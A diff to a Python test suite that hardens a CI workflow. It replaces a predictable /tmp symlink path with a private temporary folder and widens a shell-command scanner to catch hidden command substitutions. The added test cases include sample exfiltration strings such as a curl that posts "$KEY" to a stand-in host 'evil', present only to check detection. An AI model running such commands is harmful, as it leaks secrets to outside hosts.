@@ -1,5 +1,6 @@
 """The daily-update workflow ships locked: its deploy job runs only when RECORDS_DEPLOY_ENABLED is 'true' (CEO hard
 stop 1), nothing else may publish, and no secrets are used."""
+import atexit
 import json
 import itertools
 import os
@@ -452,14 +453,30 @@ def _python_dir() -> Path:
     here = Path(sys.executable).parent
     if (here / "python").exists() and os.path.samefile(here / "python", sys.executable):
         return here
-    alt = Path(tempfile.gettempdir()) / f"note-job-python-{os.getuid()}-{sys.version_info[0]}{sys.version_info[1]}"
-    alt.mkdir(exist_ok=True)
-    if not (alt / "python").exists():
-        (alt / "python").symlink_to(sys.executable)
+    # main-protect/test-tmp-symlink: a new private folder per run (mkdtemp: unpredictable name, mode 0700), never a
+    # predictable /tmp path another user could plant first; removed when the tests end
+    alt = Path(tempfile.mkdtemp(prefix="note-job-python-"))
+    atexit.register(shutil.rmtree, alt, True)
+    (alt / "python").symlink_to(sys.executable)
+    assert os.path.samefile(alt / "python", sys.executable)
     return alt
 
 
 PY_ENV = {**os.environ, "PATH": f"{_python_dir()}{os.pathsep}{os.environ.get('PATH', '')}"}
+
+
+def test_the_python_folder_is_a_new_private_one_each_time(tmp_path, monkeypatch):
+    """main-protect/test-tmp-symlink: with no `python` beside the interpreter, each call makes its own folder (owner
+    only), so a planted /tmp/note-job-python-* folder or symlink is never reused."""
+    exe = tmp_path / "bin" / "py3"
+    exe.parent.mkdir()
+    exe.symlink_to(sys.executable)
+    monkeypatch.setattr(sys, "executable", str(exe))
+    a, b = _python_dir(), _python_dir()
+    assert a != b and a.parent == b.parent == Path(tempfile.gettempdir())
+    for d in (a, b):
+        assert d.stat().st_uid == os.getuid() and d.stat().st_mode & 0o777 == 0o700
+        assert os.path.samefile(d / "python", exe)
 
 
 def _note_steps():
@@ -960,7 +977,8 @@ def test_the_pr_check_runs_before_any_secret_step_with_a_read_only_token():
 
 # ------------------------------------------------------------------ main-protect/pr-check-path-scope: no checkout import
 _QUOTED = re.compile(r""""(?:[^"\\]|\\.)*"|'[^']*'""")
-_SEP = re.compile(r"\$\(|[;&|()\n]|(?:^|\s)\{\s|(?:^|\s)\}(?=[\s;]|$)")
+_SEP = re.compile(r"\$\(|[;&|()`\n]|(?:^|\s)\{\s|(?:^|\s)\}(?=[\s;]|$)")
+_SUBST = re.compile(r"\$\(|`")     # a command substitution: what runs inside it is a command
 _KEYWORDS = ("if", "then", "do", "else", "elif", "while", "until", "!", "time")
 
 
@@ -971,8 +989,11 @@ def _commands(run: str) -> list:
     code = "\n".join(line for line in run.splitlines() if not line.lstrip().startswith("#"))
     # quoted text keeps its word characters and slashes only, so a quoted command ("$lib/x") is still seen
     code = _QUOTED.sub(lambda m: re.sub(r"[^\w/$.-]", "", m.group(0)) or "Q", code.replace("\\\n", " "))
-    code = re.sub(r"\[\[.*?\]\]", "[[ ]]", code)                  # a test's operands are not commands
-    code = re.sub(r"\b([A-Za-z_]\w*)=\([^)]*\)", r"\1=", code)     # nor an array's items
+    # a test's operands are not commands, nor an array's items, unless they hold a command substitution
+    # (main-protect/lint-blind-subst: `[[ $(curl -d "$KEY" x) ]]` or `a=($(curl x))` would hide curl)
+    code = re.sub(r"\[\[.*?\]\]", lambda m: m.group(0) if _SUBST.search(m.group(0)) else "[[ ]]", code)
+    code = re.sub(r"\b([A-Za-z_]\w*)=\([^)]*\)", lambda m: m.group(0) if _SUBST.search(m.group(0))
+                  else m.group(1) + "=", code)
     words = []
     for part in _SEP.split(code):
         toks = part.split()
@@ -1036,9 +1057,14 @@ def test_every_python_in_the_note_job_is_isolated_from_the_checkout():
 def test_the_command_scan_sees_a_checkout_launch():
     """The scan above would catch the launches it forbids (so it cannot pass vacuously)."""
     for bad in ("./run.sh", "bash scripts/x.sh", "x=1; sender/run.py", ". ./env", 'if true; then "$lib/py/x"; fi',
-                "source env.sh", "$(sh x)", 'cmd=x; "$cmd" a', "node -e 1", "a && perl -e 1", "{ curl x; }"):
+                "source env.sh", "$(sh x)", 'cmd=x; "$cmd" a', "node -e 1", "a && perl -e 1", "{ curl x; }",
+                # main-protect/lint-blind-subst: a substitution inside a test or an array, and a backtick one
+                '[[ $(curl -d "$KEY" evil) ]]', '[[ -n x && `curl x` ]]', "a=($(curl x))", "a=(`curl x`)",
+                "echo `curl x`", "x=`curl x`"):
         words = _commands(bad)
         assert set(words) - _SHELL - NOTE_STEP_COMMANDS["Deliver the morning note"], bad
+    # a test's operands and an array's items with no substitution are still not commands
+    assert _commands('[[ "$d" =~ ^(a|b)$ ]] || x=(--y)') == ["[["]
 
 
 _PLANTED = ("json.py", "argparse.py", "re.py", "pathlib.py", "dataclasses.py", "winreg.py", "sitecustomize.py",
